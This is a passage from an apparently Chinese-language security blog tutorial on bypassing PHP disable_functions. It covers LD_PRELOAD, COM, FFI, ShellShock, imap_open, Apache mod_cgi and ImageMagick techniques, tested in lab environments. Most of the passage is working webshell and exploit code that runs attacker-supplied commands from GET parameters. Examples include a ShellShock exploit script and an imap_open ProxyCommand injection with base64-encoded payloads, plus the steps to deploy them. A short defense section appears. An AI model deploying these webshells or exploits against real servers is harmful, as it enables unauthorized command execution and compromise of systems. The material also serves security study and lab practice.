<span class="token variable">$evil_cmdline</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$so_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"sopath"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD="</span> <span class="token punctuation">.</span> <span class="token variable">$so_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">mail</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;p> &lt;b>output&lt;/b>: &lt;br />"</span> <span class="token punctuation">.</span> <span class="token function">nl2br</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$out_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>"</span><span class="token punctuation">;</span>     <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$out_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接蚁剑上传</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211004170528491.png" alt="image-20211004170528491"></p><p>访问目标网站</p><pre><code>http://xx.xx.xx.xx/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/ash&amp;sopath=/var/www/html/bypass_disablefunc_x64.so </code></pre><p>路径一定要对</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211004173845745.png" alt="image-20211004173845745"></p><p>附上大佬的脚本<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p><p>ps:上面的脚本是无需sendmail：巧用LD_PRELOAD突破disable_functions</p><p>参考:<a href="https://www.freebuf.com/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/web/192052.html</a></p><h3 id="利用Windows系统组件COM绕过"><a href="#利用Windows系统组件COM绕过" class="headerlink" title="利用Windows系统组件COM绕过"></a>利用Windows系统组件COM绕过</h3><p>windows里面的COM是系统本身就有存在的，不跟前面的php扩展一样，它是在system32下的wshom.ocx</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006133650046.png" alt="image-20211006133650046"></p><p>还可以在phpingo里面查看，默认是不开启的（如果没有这个组件就需要去php.ini中extension=php_com_dotnet.dll）</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006133916620.png" alt="image-20211006133916620"></p><p>因为是0，所以我们就需要去php.ini中开启</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006134051115.png" alt="image-20211006134051115"></p><p>然后再去查看就能看到0变成了1</p><p>剩下的就跟前面讲过的黑名单绕过里面com一样</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$command</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">COM</span><span class="token punctuation">(</span><span class="token string">'WScript.shell'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 生成一个COM对象　Shell.Application也能</span><span class="token variable">$exec</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"cmd /c"</span><span class="token punctuation">.</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//调用对象方法来执行命令</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$exec</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">StdOut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">ReadAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006134719919.png" alt="image-20211006134719919"></p><h3 id="利用PHP-7-4-FFI绕过"><a href="#利用PHP-7-4-FFI绕过" class="headerlink" title="利用PHP 7.4 FFI绕过"></a>利用PHP 7.4 FFI绕过</h3><p>什么是FFI：外部函数接口。可以让用户在php里面调用c代码</p><p>条件：</p><ul><li>Linux 操作系统</li><li>PHP &gt;= 7.4</li><li>开启了 FFI 扩展且 ffi.enable=true</li></ul><p>去php.ini中开启FFI</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006190125969.png" alt="image-20211006190125969"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006190202162.png" alt="image-20211006190202162"></p><p>成功开启</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006190234944.png" alt="image-20211006190234944"></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ffi</span> <span class="token operator">=</span> <span class="token constant">FFI</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">cdef</span><span class="token punctuation">(</span><span class="token string">"int system(const char *command);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ffi</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"$cmd > /tmp/ash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"/tmp/ash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"/tmp/ash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然主要是因为FFI:cdef这个函数的作用</p><pre><code>$ffi = FFI::cdef("int system(const char *command);"); //声明了c语言中的system函数</code></pre><p>然后再是</p><pre><code>$ffi-&gt;system("$cmd &gt; /tmp/ash"); //通过GET传递的命令去执行</code></pre><p>因为输入的命令是没有回显，所以我们就需要去写进一个可读可写的路径下，就利用了</p><pre><code>echo file_get_contents("/tmp/ash");</code></pre><p>实验就采取了<a href="https://github.com/AntSwordProject/AntSword-Labs" target="_blank" rel="noopener">AntSword-Labs</a>的环境</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006193113632.png" alt="image-20211006193113632"></p><p>连接密码ant</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006193232361.png" alt="image-20211006193232361"></p><p>然后把上面的php代码上传上去</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006193902614.png" alt="image-20211006193902614"></p><p>蚁剑也有绕过的插件，也可以用这个方法，因为我蚁剑的插件半天加载不来，借用了一下靶场的图</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006194625845.png" alt="image-20211006194625845"></p><h3 id="利用-ShellShock-CVE-2014-6271"><a href="#利用-ShellShock-CVE-2014-6271" class="headerlink" title="利用 ShellShock (CVE-2014-6271)"></a>利用 ShellShock (CVE-2014-6271)</h3><p>前提条件：</p><ul><li>Linux 操作系统，php &lt; 5.6.2</li><li><code>putenv</code>，<code>mail</code> or <code>error_log</code> 但是在AntSword-Labs禁用了 <code>mail</code> 但未禁用 <code>error_log</code></li><li><code>/bin/bash</code> 存在 <code>CVE-2014-6271</code> 漏洞</li><li><code>/bin/sh -&gt; /bin/bash</code> sh 默认的 shell 是 bash</li></ul><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>什么是Bash Shellshock 破壳漏洞：在bash中有一个独特的方法就是通过环境变量去定义函数，而导致该漏洞出现的原因就是字符串 <code>() {</code> 的格式作为开头， 那么该变量就会被当前 Bash 当作一个导出函数( <code>export function</code> ) , 该函数仅会在当前 Bash 的子进程中生效。【注意()和{中间有一个空格】。在命令<code>ENV</code>中解析成函数后，<code>Bash</code>执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</p><p>同时一般函数体内的代码不会被执行，但破壳漏洞会错误的将”{}”花括号外的命令进行执行。PHP里的某些函数（例如：mail()、imap_mail()）能调用popen或其他能够派生bash子进程的函数，可以通过这些函数来触发破壳漏洞(CVE-2014-6271)执行命令</p><p>bash破击漏洞前提条件：</p><ul><li>被攻击的bash存在漏洞（版本小于等于4.3）</li><li>攻击者可以控制环境变量</li><li>新的bash进程被打开触发漏洞并执行命令</li></ul><h4 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h4><p>简单判断是否存在bash破击漏洞</p><pre><code>env x='() { :;}; echo vulnerable' bash -c "echo ash"</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006200509265.png" alt="image-20211006200509265"></p><p>当出现了vulnerable，说明存在漏洞</p><p>当然AntSword-Labs的环境也禁用了很多函数，而蚁剑 虚拟终端中已经集成了对 ShellShock 的利用, 直接在虚拟终端执行命令即可<img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006203545431.png" alt="image-20211006203545431"></p><p>而查看进程</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006204438012.png" alt="image-20211006204438012"></p><p> PHP <code>error_log</code> 函数在执行 <code>sh -c -t -i</code>时就会触发Bash 的 ShellShock 漏洞，从而任意的命令执行</p><p>这个靶场的环境的根目录有一个flag的文件，直接打开是读取不了的，并且每次执行命令都会在tmp目录下生成一个as开头的文件</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006203947814.png" alt="image-20211006203947814"></p><p>直接取读cat是不行的，用tac就可以</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006204233635.png" alt="image-20211006204233635"></p><p>或者手动使用脚本exp</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token shell-comment comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span><span class="token shell-comment comment"># Google Dork: none </span><span class="token shell-comment comment"># Date: 10/31/2014 </span><span class="token shell-comment comment"># Exploit Author: Ryan King (Starfall) </span><span class="token shell-comment comment"># Vendor Homepage: http:</span><span class="token comment" spellcheck="true">//php.net </span><span class="token shell-comment comment"># Software Link: http:</span><span class="token comment" spellcheck="true">//php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span><span class="token shell-comment comment"># Version: 5.* (tested on 5.6.2) </span><span class="token shell-comment comment"># Tested on: Debian 7 and CentOS 5 and 6 </span><span class="token shell-comment comment"># CVE: CVE-2014-6271 </span><span class="token keyword">function</span> <span class="token function">shellshock</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// Execute a command via CVE-2014-6271 @mail.c:283 </span>   <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">tempnam</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"PHP_LOL=() { x; }; $cmd >$tmp 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// In Safe Mode, the user may only alter environment variableswhose names </span>   <span class="token comment" spellcheck="true">// begin with the prefixes supplied by this directive. </span>   <span class="token comment" spellcheck="true">// By default, users will only be able to set environment variablesthat </span>   <span class="token comment" spellcheck="true">// begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, </span>   <span class="token comment" spellcheck="true">// PHP will let the user modify ANY environment variable! </span>   <span class="token comment" spellcheck="true">//mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actuallysend any mail </span>   <span class="token function">error_log</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$output</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$output</span> <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token string">"No output, or not vuln."</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">echo</span> <span class="token function">shellshock</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我直接上传到www的目录下就可以执行</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006205942034.png" alt="image-20211006205942034"></p><p>但是看别人的文章，是上传到了/var/tmp目录下通过www/html目录下的一句话，include包含了、tmp目录来执行，</p><p>简单说一下/var/tmp跟/tmp的区别：</p><ul><li><code>/tmp</code> 意味着存活时间短（TTL）的快速存储（可能很小）。许多系统的清理 <code>/tmp</code> 速度非常快 - 在某些系统上，它甚至可以安装为RAM磁盘。 </li><li><code>/var/tmp</code> 通常位于物理磁盘上，较大，可以保存较长时间的临时文件。有些系统也是干净的 <code>/var/tmp</code> - 但TTL更长。</li></ul><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006210559453.png" alt="image-20211006210559453"></p><h3 id="利用imap-open-绕过"><a href="#利用imap-open-绕过" class="headerlink" title="利用imap_open()绕过"></a>利用imap_open()绕过</h3><p>CVE-2018-19518  就是PHP的imap_open函数导致的任意命令执行漏洞，可以去vulhub上面复现一下。</p><h4 id="原理：-1"><a href="#原理：-1" class="headerlink" title="原理："></a><strong>原理：</strong></h4><p><strong>imap_open也可以说是读取邮件的函数。并且这个函数是可以执行命令的</strong></p><p><strong>PHP 的==imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令==。该漏洞的存在是因为受影响的软件的imap_open函数在==将邮箱名称==传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器（理解为邮箱服务器）名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。利用此漏洞的功能代码是Metasploit</strong></p><p><strong>rsh和ssh的区别：</strong></p><p>两个节点之间的连接方式，但是ssh比rsh更加安全</p><p>ProxyCommand 指定用于连接服务器的命令</p><pre><code>ssh -oProxyCommand="echo hello|tee /tmp/executed" localhost</code></pre><p>就是在本地localhost生成一个executed文件</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008105542413.png" alt="img"></p><p>而 CVE-2018-19518主要就是没有过滤造成的任意命令的执行</p><pre><code>imap_open（string $mailbox , string $username , string $password）</code></pre><p>函数中的mailbox是执行命令参数的一部分，所以我们可以通过更改邮箱名来进行命令注入执行</p><p>我们可以通过下面的方式来对mailbox的利用</p><pre><code>{[host]}:[port][flags]}[mailbox_name] //需要定义的的mailbox参数$mbox = imap_open ("{localhost:1234/PROTOCOL/FLAG}INBOX", "user_id", "password");</code></pre><p>这上面跟我们后面的exp有关，INBOX是当前用户的个人邮箱，还能看到localhost，端口，协议，</p><h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a><strong>分析：</strong></h4><p>比如下面这个，当我们执行命令时候，我们并没有localhost进行连接，但是仍然创建成功</p><pre><code>root@1:/var/www/html# ssh -oProxyCommand="touch ash" localhostssh_exchange_identification: Connection closed by remote hostroot@1:/var/www/html# ls | grep ashash</code></pre><p>尽管命令成功了，但是我们不能将该直接移动我们的php脚本中，也就是mailbox中，因为在解析的时候，会把空格当作空格符或者斜杠作为标志，当然空格我们可以使用\t或者$IFS去代替，而斜杠呢我们可以用base64编码去绕过，所以我们直接将我们要执行的那些命令转换成base64</p><pre><code>root@kali:# echo "touch ash" | base64dG91Y2ggYXNoCg==root@kali:# ssh -oProxyCommand="echo dG91Y2ggYXNoCg==|base64 -d|sh" localhost</code></pre><p>这里有一篇具体分析的<a href="https://xz.aliyun.com/t/4113" target="_blank" rel="noopener">https://xz.aliyun.com/t/4113</a></p><p>exp</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'imap_open'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no imap_open function!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$server</span> <span class="token operator">=</span> <span class="token string">"x -oProxyCommand=echo\t"</span> <span class="token punctuation">.</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">">/tmp/result"</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"|base64\t-d|sh}"</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token comment" spellcheck="true">//$server = 'x -oProxyCommand=echo$IFS$()' . base64_encode($_GET['cmd'] . ">/tmp/cmd_result") . '|base64$IFS$()-d|sh}';*</span><span class="token function">imap_open</span><span class="token punctuation">(</span><span class="token string">'{'</span> <span class="token punctuation">.</span> <span class="token variable">$cmd</span> <span class="token punctuation">.</span> <span class="token string">':143/imap}INBOX'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">// or var_dump("\n\nError: ".imap_last_error());*</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"/tmp/result"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显示判断是否存在imap_open，然后后就是我们要传递的命令进去，输入结果并显示出来。sleep(5)是等待imap_open执行完</p><p><strong>安装php的imap_open</strong></p><pre><code>apt-get install php-imap</code></pre><p>安装完了之后去php.ini中打开，imap.enable_insecure_rsh选项为On </p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008110439317.png" alt="img"></p><p>打开phpinfo查看</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008110500775.png" alt="img"></p><p>开启成功了</p><p>试了好久，执行命令没有回显，并且没有生成文件，有空再研究吧。</p><p>正常情况下，执行后就会有回显了，再页面上</p><h4 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a><strong>防御方式</strong></h4><ul><li>设置imap.enable_insecure_rsh选项为Off；</li><li>可以的话禁用imap_open()函数；</li></ul><h3 id="利用-Apache-Mod-CGI"><a href="#利用-Apache-Mod-CGI" class="headerlink" title="利用 Apache Mod CGI"></a><strong>利用 Apache Mod CGI</strong></h3><p>环境还是利用的AntSword-Labs</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h4><p>因为在早期的web服务器中，只能响应浏览器发来的HTTP静态资源的请求，并将存储在服务器中的静态资源返回给浏览器。随着Web技术的发展，逐渐出现了动态技术，但是Web服务器并不能够直接运行动态脚本，为了解决Web服务器与外部应用程序（CGI程序）之间数据互通，于是出现了CGI（Common Gateway Interface）通用网关接口。简单理解，可以认为CGI是Web服务器和运行在其上的应用程序进行“交流”的一种约定。</p><p>当遇到动态脚本请求时，Web服务器主进程就会Fork创建出一个新的进程来启动CGI程序，运行外部C程序或Perl、PHP脚本等，也就是将动态脚本交给CGI程序来处理。启动CGI程序需要一个过程，如读取配置文件、加载扩展等。当CGI程序启动后会去解析动态脚本，然后将结果返回给Web服务器，最后由Web服务器将结果返回给客户端，之前Fork出来的进程也随之关闭。这样，每次用户请求动态脚本，Web服务器都要重新Fork创建一个新进程去启动CGI程序，由CGI程序来处理动态脚本，处理完成后进程随之关闭，其效率是非常低下的。</p><p>而对于 Mod CGI，Web 服务器可以内置 Perl 解释器或 PHP 解释器。 也就是说将这些解释器做成模块的方式，Web 服务器会在启动的时候就启动这些解释器。 当有新的动态请求进来时，Web 服务器就是自己解析这些动态脚本，省得重新 Fork 一个进程，效率提高了。</p><p>任何具有 MIME 类型 application/x-httpd-cgi 或者被 cgi-script 处理器处理的文件都将被作为 CGI 脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为 CGI 脚本，一种是文件具有已由 AddType 指令定义的扩展名，另一种是文件位于 ScriptAlias 目录中</p><p>Apache在配置开启CGI后可以用ScriptAlias指令指定一个目录，指定的目录下面便可以存放可执行的CGI程序。若是想临时允许一个目录可以执行CGI程序并且使得服务器将自定义的后缀解析为CGI程序执行，则可以在目的目录下使用htaccess文件进行配置，如下：</p><p>Options +ExecCGI</p><p>AddHandler cgi-script .xxx</p><p>这样便会将当前目录下的所有的 .xxx 文件当做 CGI 程序执行了。由于 CGI 程序可以执行命令，那我们可以利用 CGI 来执行系统命令绕过 disable_functions。</p><p>也就是说：利用Apache的rewrite模块对 URL 进行重写的时候， rewrite规则会写在 .htaccess 文件里。但要使 apache 能够正常的读取.htaccess 文件的内容，就必须对.htaccess 所在目录进行配置</p><p>AllowOverride参数就是指明Apache服务器是否去找.htacess文件作为配置文件，如果设置为none,那么服务器将忽略.htacess文件，如果设置为All,那么所有在.htaccess文件里有的指令都将被重写</p><pre><code>Options +ExecCGIAddHandler cgi-script .xxx</code></pre><p>这样便会将当前目录下的所有的.xxx文件当做CGI程序执行了。</p><h4 id="前提"><a href="#前提" class="headerlink" title="前提"></a><strong>前提</strong></h4><ul><li>Linux 操作系统</li><li>Apache + PHP (apache 使用 apache_mod_php)</li><li>Apache 开启了 cgi、rewrite</li><li>Web 目录给了 AllowOverride 权限（不为None）</li><li>当前目录可写</li></ul><p><strong>利用</strong></p><p>打开我们的环境</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008153923119.png" alt="img"></p><p>还是一样无法执行</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008154027489.png" alt="img"></p><p>查看是否开启rewrite和CGI（在phpinfo的apache环境看）</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008154412496.png" alt="img"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008154433196.png" alt="img"></p><p>首先我们先创建一个.htaccess文件，内容如下</p><pre><code>Options +ExecCGIAddHandler cgi-script .ant</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008155430617.png" alt="img"></p><p>然后再创建一个shell.ant文件</p><pre><code>#!/bin/shecho Content-type: text/htmlecho ""echo&amp;&amp;id</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008155520246.png" alt="img"></p><p>直接访问</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008155710346.png" alt="img"></p><p>报错是因为权限不够，直接再蚁剑修改成0777，或者</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008160024035.png" alt="img"></p><p>再次访问</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008155754474.png" alt="img"></p><p>或者使用蚁剑的插件，使用后会新生成一个新的终端，然后可以执行命令</p><h3 id="利用-ImageMagick"><a href="#利用-ImageMagick" class="headerlink" title="利用 ImageMagick"></a><strong>利用 ImageMagick</strong></h3><p>什么是imagemagick：一个用于处理图片的程序，它可以读取、转换、写入多种格式的图片。图片切割、颜色替换、各种效果的应用，图片的旋转、组合，文本，直线，多边形，椭圆，曲线，附加到图片伸展旋转</p><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a><strong>原理</strong></h4><p>利用的是ImageMagick 的一个漏洞（CVE-2016-3714）。漏洞的利用过程非常简单，只要将精心构造的图片上传至使用漏洞版本的 ImageMagick，ImageMagick 会自动对其格式进行转换，转换过程中就会执行攻击者插入在图片中的命令。可以是在phpinfo中查看是否存在</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a><strong>利用</strong></h4><p>利用已经创建的好的docker环境【ImageMagick 命令执行漏洞（CVE-2016–3714）环境】</p><pre><code>docker pull medicean/vulapps:i_imagemagick_1docker run -d -p 8000:80 --name=i_imagemagick_1 medicean/vulapps:i_imagemagick_1</code></pre><p>访问一下phpinfo，看看是否存在</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008161804069.png" alt="img"></p><p>先进入容器查看一下是否存在漏洞</p><p>可以看到已经存在poc</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008162244037.png" alt="img"></p><p>执行的命令就是 ls -la</p><p>在容器内验证poc</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008162424806.png" alt="img"></p><p>在容器外验证</p><pre><code>docker exec i_imagemagick_1 convert /poc.png 1.png //i_imagemagick_1容器名称</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008162658912.png" alt="img"></p><p>验证成功存在漏洞</p><h4 id="远程命令测试使用poc"><a href="#远程命令测试使用poc" class="headerlink" title="远程命令测试使用poc"></a><strong>远程命令测试使用poc</strong></h4><p>首先访问环境中存在的poc.php</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008170709510.png" alt="img"></p><p>再来看看poc.php里面有什么</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">readImageBlob</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$base64</span> <span class="token operator">=</span> "iVBORw0KGgoAAAANSUhEUgAAAM0AAADNCAMAAAAsYgRbAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAABJQTFRF3NSmzMewPxIG<span class="token comment" spellcheck="true">//ncJEJsldTou1jHgAAAARBJREFUeNrs2EEK</span>gCAQBVDLuv<span class="token operator">+</span>V20dENbMY831wKz4Y<span class="token operator">/</span>VHb<span class="token operator">/</span><span class="token 